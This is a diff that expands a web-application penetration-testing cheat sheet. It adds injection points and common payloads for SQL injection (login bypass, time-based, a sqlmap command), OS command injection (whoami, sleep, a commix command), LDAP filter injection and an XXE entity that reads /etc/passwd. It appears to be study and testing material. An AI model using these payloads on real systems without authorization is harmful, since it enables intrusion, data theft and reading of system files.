@@ -2,19 +2,63 @@
 
 ## 1.1 SQL Injection(SQLi) :
 
-Inject malicious SQL queries to access, modify, or delete database data.
+Inject malicious SQL queries to access, modify, or delete database data. Injection path finding:
+
+- URL Parameters (?id=1)
+- Form Fields (login,search,contact forms)
+- HTTP Header (User-Agent, Referer)
+
+Common payloads :
+
+- basic ( `?id=1' --` , `?id=1' AND '1'='1` )
+- Error based ( `?id=1"` , `?id=1 AND 1=CONVERT(int, (SELECT @@version))` )
+- Time based in MySql ( `?id=1' AND SLEEP(5) --` )
+- Time based in MsSql ( `?id=1'; WAITFOR DELAY '0:0:5' --` )
+- sqlmap command ( `sqlmap -u "http://example.com/page.php?id=1" --batch --dbs` )
+- Bypass Authentication ( `' OR '1'='1` , `' OR 1=1--` )
 
 ## 1.2 Command Injection :
 
-Execute arbitrary system-level commands on the server.
+Execute arbitrary system-level commands on the server. Look for input fields or URLs that interact with system-level commands, such as:
+
+- Search Box
+- Ping/Traceroute utilities
+- File upload/rename/delete functions
+- URL Parameters like: ( ?host=, ?ip=, ?cmd=, ?target= )
+
+Common payload :
+
+- linux ( `127.0.0.1; whoami` )
+- window ( `127.0.0.1 && whoami` )
+- linux delay ( `127.0.0.1; sleep 5` )
+- windows delay ( `127.0.0.1 & ping -n 6 127.0.0.1` )
+- Commix command ( `commix --url="http://example.com/page?host=127.0.0.1" --level=2` )
 
 ## 1.3 LDAP Injection :
 
-Manipulate LDAP queries to bypass authentication or access data.
+Manipulate LDAP queries to bypass authentication or access data. Look for :
+
+- Search fields (e.g., employee name, email, department)
+- Login or lookup functions
+- URLParameters like: ( username=, filter=, search= )
+
+Common Payload :
+
+- Always true ( `admin*)(&)` )
+- Add new one ( `*)(uid=*)` )
+- And Or Condition ( `admin)(|(uid=*))` )
 
 ## 1.4 XML External Entity (XXE) :
 
-Exploit XML parsers to disclose internal files or SSRF attacks.
+Exploit XML parsers to disclose internal files or SSRF attacks. For XXE attack:
+
+- Capture a POST request with XML data.
+- Add the XXE payload in the body.
+- Forward and monitor the response or OOB DNS logs.
+
+Common Payload :
+
+- In-Bind attack <pre> `xml <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd" >]> <user> <name>&xxe;</name> </user> ` </pre>
 
 ---
 
@@ -183,3 +227,11 @@ Brute-force login, password reset, or OTP endpoints without being blocked.
 ## 14.2 Resource Exhaustion :
 
 Crash or slow down the app by sending huge payloads or excessive requests.
+
+```
+
+```
+
+```
+
+```
